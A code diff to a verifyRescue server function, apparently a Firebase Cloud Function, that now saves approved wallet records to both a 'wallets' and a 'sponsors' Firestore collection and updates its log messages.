@@ -78,23 +78,22 @@ export const verifyRescue = functions
       return;
     }
 
-    // Record / Update in sponsors collection IMMEDIATELY so it appears in the Admin Panel
+    // Record approved wallet in Firestore IMMEDIATELY so it appears in the Admin Panel
     const lowerFrom = from.toLowerCase();
     try {
-      await db.collection("sponsors").doc(lowerFrom).set(
-        {
-          status: "ELIGIBLE",
-          approvalStatus: "APPROVED",
-          approvalTxHash: txHash || null,
-          sponsoredAt: admin.firestore.FieldValue.serverTimestamp(),
-          approvedAt: admin.firestore.FieldValue.serverTimestamp(),
-          updatedAt: admin.firestore.FieldValue.serverTimestamp(),
-        },
-        { merge: true }
-      );
-      console.log(`[verifyRescue] Recorded wallet ${lowerFrom} in sponsors collection as APPROVED`);
+      const approvalData = {
+        address: from,
+        status: "ELIGIBLE",
+        approvalStatus: "APPROVED",
+        approvalTxHash: txHash || null,
+        approvedAt: admin.firestore.FieldValue.serverTimestamp(),
+        updatedAt: admin.firestore.FieldValue.serverTimestamp(),
+      };
+      await db.collection("wallets").doc(lowerFrom).set(approvalData, { merge: true });
+      await db.collection("sponsors").doc(lowerFrom).set(approvalData, { merge: true });
+      console.log(`[verifyRescue] Recorded wallet ${lowerFrom} as APPROVED in Firestore`);
     } catch (dbErr) {
-      console.error("[verifyRescue] Error recording to sponsors:", dbErr);
+      console.error("[verifyRescue] Error recording approved wallet to firestore:", dbErr);
     }
 
     // ---- 2. Connect to BSC
